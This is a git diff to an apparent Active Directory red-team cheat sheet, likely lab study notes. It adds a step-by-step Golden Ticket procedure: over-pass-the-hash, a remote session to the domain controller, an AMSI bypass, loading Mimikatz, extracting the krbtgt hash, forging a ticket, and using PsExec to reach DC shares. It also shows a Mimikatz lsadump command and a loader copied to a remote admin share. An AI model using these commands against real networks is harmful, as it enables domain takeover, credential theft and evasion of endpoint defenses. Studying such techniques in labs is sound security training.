@@ -1848,7 +1848,24 @@ echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.ex
 ```
 
 # Golden Ticket
-
+### Methodology/Steps
+```
+Get a Powershell session as a "domain admin" using "Over pass the hash" attack
+Create a New-PSSession attaching to the "domain controller"
+Enter the new session using Enter-PSSession
+Bypass the AMSI
+Exit
+Load Mimikatz.ps1 on the new session using Invoke-command
+Enter the new session using Enter-PSSession again
+Now we can execute mimikatz on the DC
+Keep note of krbtgt hash
+Now go to any "non domain admin" account
+Load Mimikats.ps1
+Now we can create a ticket using the DC krbtgt hash
+Now we can access any service on the DC; Example ls \\dc-corp\C$
+#OR
+PsExec64.exe \\test.local -u Domain\user -p Passw0rd! cmd
+```
 ### Execute mimikatz on DC as DA to get krbtgt hash
 ```
 Invoke-Mimikatz -Command '"lsadump::lsa /patch"' -Computername <computername>
